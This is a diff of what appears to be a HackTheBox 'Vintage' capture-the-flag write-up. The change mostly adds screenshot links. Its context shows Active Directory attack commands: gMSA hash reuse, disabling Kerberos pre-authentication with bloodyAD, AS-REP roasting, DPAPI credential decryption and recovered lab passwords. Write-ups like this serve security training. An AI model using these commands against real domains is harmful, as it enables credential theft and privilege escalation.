@@ -1,7 +1,7 @@
 ---
 title: "HTB - Vintage (Hard | Windows | Active Directory)"
 date: 2025-08-15
-categories: [HackTheBox, Active Directory, pre2k, DPAPI ]
+categories: [HackTheBox, Active Directory, pre2k, DPAPI]
 tags: [htb, active-directory, kerberos, dpapi, pre2k, gmsa, as-rep-roasting, constrained-delegation, bloodhound, impacket]
 image:
   path: https://i.pinimg.com/originals/ff/a9/6e/ffa96ede4039820cdac1185df70b8dc7.gif
@@ -100,6 +100,9 @@ bloodhound-python -u 'P.Rosa' -p 'Rosaisbest1' \
   -d 'vintage.htb' -ns 10.10.11.45 --zip -c All -dc 'dc01.vintage.htb'
 ```
 
+![BloodHound graph 1](/assets/img/posts/vintage/bh1.png)
+![BloodHound graph 2](/assets/img/posts/vintage/bh2.png)
+
 Key findings from BloodHound:
 
 - `FS01$` has **ReadGMSAPassword** over `GMSA01$`
@@ -148,6 +151,8 @@ getTGT.py vintage.htb/'GMSA01$' -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178
 export KRB5CCNAME=GMSA01\$.ccache
 ```
 
+![BloodHound GMSA01 path](/assets/img/posts/vintage/bh3.png)
+
 ### Abusing GenericWrite — Adding to SERVICEMANAGERS
 
 ```bash
@@ -162,6 +167,9 @@ bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
 
 With `GenericWrite` over service accounts in `SERVICEMANAGERS`, we can disable Kerberos pre-authentication and roast them.
 
+![BloodHound GenericWrite path](/assets/img/posts/vintage/bh4.png)
+![BloodHound SERVICEMANAGERS members](/assets/img/posts/vintage/bh5.png)
+
 ### Disable Pre-Auth
 
 ```bash
@@ -169,6 +177,8 @@ bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
   --dc-ip 10.10.11.45 -k \
   add uac <service_user> -f DONT_REQ_PREAUTH
 ```
+
+![bloodyAD disable preauth](/assets/img/posts/vintage/bloody1.png)
 
 > Note: This works on service accounts but not regular user accounts (insufficient permissions).
 
@@ -180,11 +190,15 @@ bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
   remove uac <service_user> -f ACCOUNTDISABLE
 ```
 
+![bloodyAD re-enable accounts](/assets/img/posts/vintage/bloody2.png)
+
 ### AS-REP Roast
 
 ```bash
 GetNPUsers.py vintage.htb/ -request -usersfile users.txt -format hashcat
 ```
+
+![GetNPUsers output](/assets/img/posts/vintage/getnpusers1.png)
 
 ### Crack with Hashcat
 
@@ -231,6 +245,8 @@ Get-ChildItem "C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials" -Force | F
 Get-ChildItem "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect" -Force | Format-List
 ```
 
+![DPAPI AppData result](/assets/img/posts/vintage/dpapi-result.png)
+
 Two master keys found. Download all files with evil-winrm's `download` command.
 
 ### Decrypt Master Keys
@@ -257,6 +273,8 @@ dpapi.py credential \
   -key <decrypted_master_key_hex>
 ```
 
+![DPAPI credential dump](/assets/img/posts/vintage/dpapi-dump.png)
+
 Credentials recovered: `C.Neri_adm : Uncr4ck4bl3P4ssW0rd0312`
 
 ---
@@ -268,7 +286,12 @@ Credentials recovered: `C.Neri_adm : Uncr4ck4bl3P4ssW0rd0312`
 ```bash
 bloodhound-python -u 'C.Neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' \
   -d 'vintage.htb' -ns 10.10.11.45 --zip -c All -dc 'dc01.vintage.htb'
+```
 
+![BloodHound C.Neri_adm graph](/assets/img/posts/vintage/bh6.png)
+![BloodHound DelegatedAdmins path](/assets/img/posts/vintage/bh7.png)
+
+```bash
 getTGT.py vintage.htb/'c.neri_adm':'Uncr4ck4bl3P4ssW0rd0312'
 export KRB5CCNAME=c.neri_adm.ccache
 ```
